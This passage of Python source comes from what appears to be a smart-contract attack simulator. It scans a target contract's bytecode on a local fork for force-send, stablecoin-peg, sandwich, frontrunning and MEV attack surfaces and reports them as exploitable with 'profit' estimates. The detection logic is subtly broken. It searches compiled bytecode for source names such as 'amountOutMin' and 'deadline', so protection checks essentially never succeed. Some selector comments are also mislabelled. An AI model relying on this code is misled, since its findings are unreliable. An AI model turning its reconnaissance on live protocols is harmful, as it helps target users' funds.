            has_balance = any(m in code for m in balance_markers)
            steps.append({"step": "totalAssets/convert functions",
                          "value": "detected" if has_assets else "not found"})
            steps.append({"step": "balance accounting",
                          "value": "detected" if has_balance else "not found"})
            if has_assets and has_balance:
                # Try to read totalAssets
                r = self._call("totalAssets()", [], extra_from=False)
                if r["ok"]:
                    assets = self._to_int(r["stdout"])
                    steps.append({"step": "totalAssets()",
                                  "value": str(assets) if assets else r["stdout"]})
                    # Compare with actual ETH balance
                    bal = self._to_int(self._balance(target))
                    steps.append({"step": "actual ETH balance",
                                  "value": str(bal) if bal else "could not read"})
                    if assets and bal and assets > bal:
                        return {"success": True, "attack": "forcesend",
                                "target": target,
                                "profit": "Force-send ETH can inflate share price",
                                "steps": steps,
                                "evidence": (f"totalAssets ({assets}) > actual balance ({bal}) — "
                                             "contract reports value beyond its ETH holdings"),
                                "source_finding": source_finding}
                    return {"success": False, "attack": "forcesend",
                            "target": target, "steps": steps,
                            "evidence": ("totalAssets matches ETH balance — "
                                         "force-send not exploitable here."),
                            "source_finding": source_finding, "verdict": "REFUTED"}
            return {"success": False, "attack": "forcesend", "target": target,
                    "steps": steps,
                    "evidence": ("No force-send accounting surface found "
                                 "(no totalAssets or balance-based accounting)."),
                    "source_finding": source_finding}

        if attack == "peg":
            # Stablecoin peg attack: can the collateral backing ratio be
            # manipulated? Check for vault + collateral swap functions.
            code = self._code_hex()
            vault_markers = ["0x5b6fc7a8",  # openVault()
                             "0xb1d4c5ef"]  # openVault(address)
            swap_markers = ["0x76cc7a9a",  # swapCollateral
                            "0x0f7ee467",  # swapCollateral(uint256,uint256)
                            "0xd5c72b81"]  # swapCollateral
            has_vault = any(m in code for m in vault_markers)
            has_swap = any(m in code for m in swap_markers)
            steps.append({"step": "vault open function",
                          "value": "detected" if has_vault else "not found"})
            steps.append({"step": "collateral swap",
                          "value": "detected" if has_swap else "not found"})
            if has_vault and has_swap:
                # Check for oracle dependency in swap
                oracle_in_swap = any(m in code for m in ["0x50d25bcd", "0x883bdbfd"])
                steps.append({"step": "oracle in swap path",
                              "value": "yes" if oracle_in_swap else "not detected"})
                return {"success": True, "attack": "peg",
                        "target": target,
                        "profit": "Collateral swap at distorted price mints unbacked stablecoin",
                        "steps": steps,
                        "evidence": ("Vault + collateral swap present — "
                                     "combine with oracle manipulation for peg attack"),
                        "source_finding": source_finding,
                        "verdict": "UNVERIFIED"}  # needs oracle combo proof
            return {"success": False, "attack": "peg", "target": target,
                    "steps": steps,
                    "evidence": ("No peg attack surface found "
                                 "(no vault + collateral swap functions)."),
                    "source_finding": source_finding}

        if attack == "sandwich":
            # Sandwich MEV: detect if the contract's swap/AMM function is
            # vulnerable to sandwich attacks (no slippage protection, no
            # deadline, no frontrunning guard). The attacker front-runs
            # a victim's swap, then back-runs to extract value.
            code = self._code_hex()

            # UniswapV2/V3 swap selectors
            swap_selectors = [
                "0x022c0d9f",  # swap(uint256,uint256,address,bytes) — UniV2
                "0x128acb08",  # swap(uint256,uint256,address,bytes) — UniV3
                "0x38ed1739",  # swapExactTokensForTokens
                "0x8803dbee",  # swapTokensForExactTokens
                "0x7ff36ab5",  # swapExactETHForTokens
                "0xfb3bdb41",  # swapETHForExactTokens
                "0x18cbafe5",  # swapExactTokensForETH
                "0x7a56c64c",  # swapTokensForExactETH
            ]
            has_swap = any(m in code for m in swap_selectors)

            # Slippage protection: check for amountOutMin / amountOut minimum
            # Uniswap uses this pattern in the calldata
            slippage_markers = [
                "amountOutMin",   # common in UniV2-style
                "slippage",       # DEX aggregator slippage param
                "minOut",         # min output amount
                "minimumOut",     # minimum output
            ]
            # Check if the swap function takes a deadline parameter
            deadline_markers = [
                "deadline",       # UniV2/V3 deadline param
                "block.timestamp", # deadline check
            ]

            steps.append({"step": "swap/AMM function",
                          "value": "detected" if has_swap else "not found"})

            if has_swap:
                # Check if the contract itself has slippage protection
                # (the contract's own swaps, not the DEX's)
                has_slippage = any(m in code for m in slippage_markers)
                has_deadline = any(m in code for m in deadline_markers)
                steps.append({"step": "slippage protection",
                              "value": "detected" if has_slippage else "NOT FOUND"})
                steps.append({"step": "deadline protection",
                              "value": "detected" if has_deadline else "NOT FOUND"})

                # If the contract does swaps without slippage/deadline,
                # it's sandwichable
                if not has_slippage and not has_deadline:
                    return {"success": True, "attack": "sandwich",
                            "target": target,
                            "profit": "Sandwich: front-run + back-run to extract swap slippage",
                            "steps": steps,
                            "evidence": ("Swap function present but NO slippage protection "
                                         "and NO deadline — sandwichable by MEV bots"),
                            "source_finding": source_finding,
                            "verdict": "UNVERIFIED"}  # needs mempool to confirm

                # Contract has some protection — informational
                steps.append({"step": "sandwich risk",
                              "value": "contract has slippage/deadline protection"})
            return {"success": False, "attack": "sandwich", "target": target,
                    "steps": steps,
                    "evidence": ("No sandwich attack surface found "
                                 "(no swap function, or slippage protection present)."),
                    "source_finding": source_finding,
                    **({"verdict": "REFUTED"} if has_swap and has_slippage else {})}

        if attack == "frontrun":
            # Frontrunning: can the contract's state changes be front-run
            # for profit? Check for time-sensitive operations (liquidation,
            # auction, claim) without commit-reveal or Flashbots protection.
            code = self._code_hex()

            # Time-sensitive functions
            frontrun_targets = [
                "0x69ab90df",  # liquidate(address,uint256,address,address) — Aave
                "0xe8eda9df",  # liquidationCall(address,address,uint256,bool) — Aave V3
                "0xc9c65396",  # auction(uint256) — NFT auctions
                "0x3ccfd60b",  # withdraw(uint256) — claim/stake
                "0x2e1a7d4d",  # withdraw(uint256) — WETH
                "0xa69df4b1",  # claimReward() — staking rewards
                "0x379607f5",  # compound(uint256) — compound interest
                "0xb6b55f25",  # deposit() — vault entry
            ]
            has_frontrun_target = any(m in code for m in frontrun_targets)

            # Protection mechanisms
            commit_reveal = [
                "0x52e0b902",  # commit(bytes32) — commit-reveal
                "0x2029a73e",  # reveal(uint256,bytes32) — commit-reveal
            ]
            flashbots = [
                "0x",  # Flashbots bundle
                "MEV",  # MEV protection mention
            ]
            has_protection = any(m in code for m in commit_reveal)

            steps.append({"step": "time-sensitive function",
                          "value": "detected" if has_frontrun_target else "not found"})
            steps.append({"step": "commit-reveal protection",
                          "value": "detected" if has_protection else "NOT FOUND"})

            if has_frontrun_target and not has_protection:
                return {"success": True, "attack": "frontrun",
                        "target": target,
                        "profit": "Frontrunning: execute before victim for guaranteed profit",
                        "steps": steps,
                        "evidence": ("Time-sensitive function (liquidation/auction/claim) "
                                     "without commit-reveal protection — frontrunnable"),
                        "source_finding": source_finding,
                        "verdict": "UNVERIFIED"}  # needs mempool
            return {"success": False, "attack": "frontrun", "target": target,
                    "steps": steps,
                    "evidence": ("No frontrunning surface found "
                                 "(no time-sensitive function, or commit-reveal present)."),
                    "source_finding": source_finding,
                    **({"verdict": "REFUTED"} if has_protection else {})}

        if attack == "mev":
            # MEV (Miner Extractable Value) surface: comprehensive check
            # for all MEV attack vectors on the contract. Combines sandwich,
            # frontrunning, and liquidation MEV detection into one report.
            code = self._code_hex()

            # Sandwich vectors
            swap_selectors = ["0x022c0d9f", "0x128acb08", "0x38ed1739",
                              "0x8803dbee", "0x7ff36ab5", "0xfb3bdb41"]
            has_swap = any(m in code for m in swap_selectors)

            # Liquidation vectors (MEV bots compete for liquidation bonuses)
            liq_selectors = ["0x69ab90df",  # liquidate — Aave V2
                             "0xe8eda9df",  # liquidationCall — Aave V3
                             "0xf5e2122a"]  # liquidate — Compound
            has_liq = any(m in code for m in liq_selectors)

            # Auction vectors (NFT/protocol auctions frontrunnable)
            auction_selectors = ["0xc9c65396",  # auction
                                 "0x4e1d9206",  # bid
                                 "0x3af4e04e"]  # placeBid
            has_auction = any(m in code for m in auction_selectors)

            # Slippage protection
            has_slippage = any(m in code for m in ["amountOutMin", "slippage", "minOut"])
            has_deadline = any(m in code for m in ["deadline", "block.timestamp"])

            vectors = []
            if has_swap:
                vectors.append("sandwich (swap without slippage)" if not has_slippage
                              else "swap (slippage protected)")
            if has_liq:
                vectors.append("liquidation MEV (compete for bonus)")
            if has_auction:
                vectors.append("auction frontrunning")

            steps.append({"step": "MEV vectors",
                          "value": ", ".join(vectors) if vectors else "none detected"})
            steps.append({"step": "slippage protection",
                          "value": "present" if has_slippage else "missing"})

            mev_score = len([v for v in vectors if "protected" not in v])

            if mev_score > 0:
                return {"success": True, "attack": "mev",
                        "target": target,
                        "profit": f"MEV exposure: {mev_score} exploitable vector(s)",
                        "steps": steps,
                        "evidence": (f"MEV vectors: {', '.join(vectors)}; "
                                     f"slippage={'yes' if has_slippage else 'no'}"),
                        "source_finding": source_finding,
                        "verdict": "UNVERIFIED"}  # needs mempool
            return {"success": False, "attack": "mev", "target": target,
                    "steps": steps,
                    "evidence": "No MEV attack surface detected.",
                    "source_finding": source_finding}

        return {"success": False, "attack": attack, "target": target,
                "error": f"ForkSimulator does not support attack '{attack}'",
                "source_finding": source_finding}

    def _code_hex(self) -> str:
        """Raw bytecode hex of the target (for selector scanning)."""
        if not getattr(self, "_target", None) or not self.available:
            return ""
        if self._live and self._live.available:
            return self._live.get_code(self._target)
        proc = subprocess.run(
            ["cast", "code", self._target, "--rpc-url", self.rpc_url_local],
            capture_output=True, text=True, timeout=30)
        return proc.stdout.strip()

    def __exit__(self, exc_type, exc, tb) -> None:
        # LiveFork: nothing to clean up
        if self._live is not None:
            try:
                self._live.__exit__(exc_type, exc, tb)
            except Exception:
                pass
            self._live = None
        # Anvil: terminate the process
        if self.proc is not None:
            self.proc.terminate()
            try:
                self.proc.wait(timeout=5)
            except Exception:
                self.proc.kill()
            self.proc = None
